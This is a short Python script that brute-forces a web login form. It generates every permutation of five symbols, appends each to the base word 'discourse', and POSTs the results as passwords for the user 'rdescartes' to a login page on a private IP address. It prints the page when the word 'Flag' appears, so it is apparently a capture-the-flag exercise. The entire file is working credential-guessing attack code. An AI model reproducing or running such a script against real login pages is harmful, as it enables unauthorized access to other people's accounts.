#!/usr/bin/python3
#web-client2.py
import urllib3
import requests
from bs4 import BeautifulSoup


http = urllib3.PoolManager()

######################################
##  making a list of all passowrds  ##
######################################
from itertools import permutations
perm = permutations(["!", "@", "#", "%", "&"])
password = []
for i in list(perm):
  password.append("".join(i))
#print(password)





url = 'http://192.168.142.68:8080/login-2/'

for x in password:
    fullpassword = "discourse"
    fullpassword = str(fullpassword + x)
    #print(fullpassword)
    info = {'username': 'rdescartes', 'password': fullpassword}
    #info = {'username': 'rdescartes', 'password': 'discourse!@#%'}
    
    
    
    
    ## uses requests post = requests.post(url, data = info)
    post = http.request('POST', url, fields=info)



    
    ## uses requests results = post.text
    
    ## uses urllib print(post.data)
    
    #results = str(post.data)
    results = post.data.decode('utf-8')
    
    soup = BeautifulSoup(results, features="html.parser")

    results2 = soup.get_text()

    if "Flag" in results2:
        print(results2)
        print("The password is: " + fullpassword)



#    print(link.string)
    #print(link.get('href'))



    
    
    #print(soup)
    #print(results)
    
    
    saved = open("results2.txt", "a")
    n = saved.write(results2)
    saved.close()
    
    
    
    
    



print("\n\n\n finished")